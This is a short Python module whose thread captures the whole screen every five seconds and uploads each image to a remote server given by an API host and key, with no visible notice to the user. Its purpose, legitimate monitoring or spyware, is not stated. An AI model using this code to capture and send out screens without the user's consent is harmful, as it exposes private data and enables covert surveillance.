import threading
import pyautogui
import requests
import os

from time import sleep

class Screenshot(threading.Thread):

    def __init__(self, api: str, key: str):
        super().__init__()
        self.name = "Screenshot"
        self.api = api
        self.key = key

    def run(self):
        while True:

            try:

                response = requests.post("https://" + self.api + "/screenshot",
                                         headers={"x-api-key": self.key})
                # Take screenshot
                pic = pyautogui.screenshot()
                # Save the image
                file_name = 'Screenshot.jpg'
                pic.save(file_name)
                files = {'file': (file_name, open(file_name, 'rb'), 'image/png', {'Expires': '0'})}
                if response.ok:
                    print(response.json())
                    upload = response.json()

                    upload_screenshot = requests.post(upload['url'], data=upload['fields'], files=files)
                    print(upload_screenshot)

                else:
                    print(response.status_code)
                    print(response.reason)

            except Exception as e:
                print(e)
            sleep(5)

